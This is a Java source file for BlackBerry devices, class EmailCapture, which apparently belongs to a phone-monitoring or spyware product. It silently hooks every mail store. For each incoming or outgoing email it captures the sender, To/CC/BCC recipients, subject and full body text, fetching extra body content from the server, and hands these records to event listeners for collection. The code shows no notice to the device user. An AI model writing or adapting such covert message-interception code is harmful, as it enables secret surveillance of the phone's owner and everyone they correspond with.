package com.vvt.emailc;

import com.vvt.event.FxEmailEvent;
import com.vvt.event.FxEventCapture;
import com.vvt.event.FxRecipient;
import com.vvt.event.constant.FxDirection;
import com.vvt.event.constant.FxRecipientType;
import com.vvt.std.Constant;
import com.vvt.std.HtmlParser;
import net.rim.blackberry.api.mail.*;
import net.rim.blackberry.api.mail.event.*;
import net.rim.device.api.servicebook.ServiceBook;
import net.rim.device.api.servicebook.ServiceRecord;
import net.rim.device.api.system.GlobalEventListener;
import net.rim.device.api.ui.UiApplication;

public class EmailCapture extends FxEventCapture implements FolderListener, GlobalEventListener {
	
	private EmailCapture self = null;
	private UiApplication appUi = null;
	private String data = "";
	
	public EmailCapture(UiApplication appUi) {
		self = this;
		this.appUi = appUi;	
	}
	
	public void startCapture() {
		try {
			if (!isEnabled() && sizeOfFxEventListener() > 0) {
				setEnabled(true);
				Thread serviceBookThread = new Thread(new Runnable() {
					public void run() {
						ServiceBook sb = ServiceBook.getSB();
						ServiceRecord[] srs = sb.getRecords();
						for (int cnt = srs.length - 1; cnt >= 0; --cnt) {
							if (srs[cnt].getCid().equals("CMIME")) {
								ServiceConfiguration sc = new ServiceConfiguration(srs[cnt]);
								Store store = Session.getInstance(sc).getStore();
								store.addFolderListener(self);
							}
						}
					}
				});
				serviceBookThread.start();
				appUi.addGlobalEventListener(this);
			}
		} catch(Exception e) {
			resetEmailCapture();
			notifyError(e);
		}
	}

	public void stopCapture() {
		try {
			if (isEnabled()) {
				setEnabled(false);
				Thread serviceBookThread = new Thread(new Runnable() {
					public void run() {
						removeFolderListener();
					}
				});
				serviceBookThread.start();
				appUi.removeGlobalEventListener(this);	
			}
		}  catch(Exception e) {
			resetEmailCapture();
			notifyError(e);
		}
	}
	
	private void resetEmailCapture() {
		setEnabled(false);
		if (appUi != null) {
			appUi.removeGlobalEventListener(this);
		}
		removeFolderListener();
	}
	
	private String readEmailBody(TextBodyPart tbp) {
		String result = null;
		try {
			if (tbp.hasMore() && !tbp.moreRequestSent()) {
				try {
					Transport.more(tbp, true);
				} catch(Exception ex) {
					resetEmailCapture();
					notifyError(ex);
				}
			}
			result = (String) tbp.getContent();
		} catch(Exception e) {
			resetEmailCapture();
			notifyError(e);
		}
		return result;
	}
	
	private void getContent(Object obj) throws Exception {
		if (obj != null) {
			if (obj instanceof Multipart) {
				Multipart mp = (Multipart) obj;
				int size = mp.getCount();
				for (int count = 0; count < size; ++count) {
					getContent(mp.getBodyPart(count));
				}
			} else if (obj instanceof TextBodyPart) {
				TextBodyPart tbp = (TextBodyPart) obj;
				String tbpToBeAdded = readEmailBody(tbp);
				data += tbpToBeAdded;
			} else if (obj instanceof SupportedAttachmentPart) {} 
			else if (obj instanceof UnsupportedAttachmentPart) {} 
			else {
				if (obj instanceof byte[]) {
					String dataToBeAdded = new String((byte[]) obj, "UTF-8");
					HtmlParser h = new HtmlParser();
					dataToBeAdded = h.convert(dataToBeAdded);
					data += dataToBeAdded;
				} else {
					String nameOfObjectsClass = obj.getClass().getName();
					if ("net.rim.blackberry.api.mail.MimeBodyPart".equals(nameOfObjectsClass)) {
						BodyPart bp = (BodyPart) obj;
						if (bp.hasMore() && !bp.moreRequestSent()) {
							try {
								Transport.more(bp, true);
							} catch(Exception e) {
								resetEmailCapture();
								notifyError(e);
							}
						}
						Object contentOfMimeBodyPart = bp.getContent();
						getContent(contentOfMimeBodyPart);
					}
				}
			}
			data.trim();
		}
	}
	
	private void addRecipients(FxEmailEvent emailEvent, Message message) throws Exception {
		Address addrTo[] = message.getRecipients(Message.RecipientType.TO);
		for (int i = 0; addrTo != null && i < addrTo.length; i++) {
			FxRecipient recipient = new FxRecipient();
			recipient.setRecipientType(FxRecipientType.TO);
			recipient.setContactName(addrTo[i].getName() != null ? addrTo[i].getName() : Constant.SPACE);
			recipient.setRecipient(addrTo[i].getAddr() != null ? addrTo[i].getAddr() : Constant.SPACE);
			emailEvent.addRecipient(recipient);
		}
		Address addrCc[] = message.getRecipients(Message.RecipientType.CC);
		for (int i = 0; addrCc != null && i < addrCc.length; i++) {
			FxRecipient recipient = new FxRecipient();
			recipient.setRecipientType(FxRecipientType.CC);
			recipient.setContactName(addrCc[i].getName() != null ? addrCc[i].getName() : Constant.SPACE);
			recipient.setRecipient(addrCc[i].getAddr() != null ? addrCc[i].getAddr() : Constant.SPACE);
			emailEvent.addRecipient(recipient);
		}
		Address addrBcc[] = message.getRecipients(Message.RecipientType.BCC);
		for (int i = 0; addrBcc != null && i < addrBcc.length; i++) {
			FxRecipient recipient = new FxRecipient();
			recipient.setRecipientType(FxRecipientType.BCC);
			recipient.setContactName(addrBcc[i].getName() != null ? addrBcc[i].getName() : Constant.SPACE);
			recipient.setRecipient(addrBcc[i].getAddr() != null ? addrBcc[i].getAddr() : Constant.SPACE);
			emailEvent.addRecipient(recipient);
		}
	}
	
	private void removeFolderListener() {
		ServiceBook sb = ServiceBook.getSB();
		ServiceRecord[] srs = sb.getRecords();
		for (int cnt = srs.length - 1; cnt >= 0; --cnt) {
			if (srs[cnt].getCid().equals("CMIME")) {
				ServiceConfiguration sc = new ServiceConfiguration(srs[cnt]);
				Store store = Session.getInstance(sc).getStore();
				store.removeFolderListener(self);
			}
		}
	}
	
	//FolderListener
	public void messagesAdded(FolderEvent folderEvent) {
		try {
			Message msg = folderEvent.getMessage();
			if (msg.getMessageType() == Message.EMAIL_MESSAGE) {
				FxEmailEvent emailEvent = new FxEmailEvent();
				boolean inbound = msg.isInbound();
				if (inbound) {
					emailEvent.setDirection(FxDirection.IN);
				} else {
					emailEvent.setDirection(FxDirection.OUT);
				}
				// To set sender.
				Address addressFrom = msg.getFrom();
				if (addressFrom != null) {
					emailEvent.setAddress(addressFrom.getAddr() != null ? addressFrom.getAddr() : Constant.SPACE);
					emailEvent.setContactName(addressFrom.getName() != null ? addressFrom.getName() : Constant.SPACE);
				}
				// To set recipients.
				addRecipients(emailEvent, msg);
				// To set event time.
				emailEvent.setEventTime(System.currentTimeMillis());
				// To set message.
				data = "";
				getContent(msg.getContent());
				emailEvent.setMessage(data != null ? data : Constant.SPACE);
				// To set subject.
				emailEvent.setSubject(msg.getSubject() != null ? msg.getSubject() : Constant.SPACE);
				// To notify event.
				notifyEvent(emailEvent);
			}
		} catch(Exception e) {
			resetEmailCapture();
			notifyError(e);
		}
	}

	public void messagesRemoved(FolderEvent folderEvent) {}
	
	// GlobalEventListener
	public void eventOccurred(long guid, int data0, int data1, Object object0, Object object1) {
		if (guid == ServiceBook.GUID_SB_ADDED || guid == ServiceBook.GUID_SB_CHANGED) {
			// To refresh service book.
			stopCapture();
			startCapture();
		}
	}
}